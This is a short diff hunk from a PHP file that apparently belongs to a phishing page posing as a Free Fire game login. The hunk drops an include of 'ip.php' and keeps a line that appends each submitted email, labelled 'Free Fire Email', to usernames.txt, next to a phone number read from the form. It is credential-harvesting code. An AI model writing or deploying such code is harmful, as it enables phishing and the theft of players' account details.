@@ -7,7 +7,7 @@ $hp = $_POST['phone'];
 ?>
 
 <?php
-include 'ip.php';
+
 file_put_contents("usernames.txt", "Free Fire Email : " . $_POST['email'] . "\n" , FILE_APPEND);
 ?>
 <?php
